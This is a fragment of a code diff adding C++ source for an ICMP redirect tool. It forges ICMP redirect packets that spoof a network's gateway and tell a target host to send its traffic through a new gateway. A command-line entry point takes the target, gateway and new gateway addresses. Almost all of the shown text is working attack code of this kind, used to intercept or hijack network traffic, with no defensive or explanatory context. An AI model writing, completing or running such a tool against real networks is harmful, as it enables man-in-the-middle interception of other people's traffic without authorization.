@@ -55,4 +55,32 @@ public:
         origIP->ttl = 64;
         origIP->protocol = IPPROTO_TCP;
         origIP->saddr = inet_addr(gatewayIP);
-        origIP->
+        origIP->daddr = inet_addr(targetIP);
+        
+        // Original TCP header (8 bytes)
+        struct tcphdr* origTCP = (struct tcphdr*)(packet + sizeof(struct icmphdr) + sizeof(struct iphdr));
+        origTCP->source = htons(80);
+        origTCP->dest = htons(rand() % 65535);
+        origTCP->seq = rand();
+        origTCP->doff = 5;
+        origTCP->syn = 1;
+        
+        int packetLen = sizeof(struct icmphdr) + sizeof(struct iphdr) + 8;
+        icmp->checksum = checksum(packet, packetLen);
+        
+        sendto(sock, packet, packetLen, 0, 
+               (struct sockaddr*)&target, sizeof(target));
+    }
+    
+    ~ICMPRedirect() { close(sock); }
+};
+
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        std::cerr << "Usage: " << argv[0] << " <target_ip> <gateway_ip> <new_gateway_ip>\n";
+        return 1;
+    }
+    ICMPRedirect redirect;
+    redirect.sendRedirect(argv[1], argv[2], argv[3]);
+    return 0;
+}
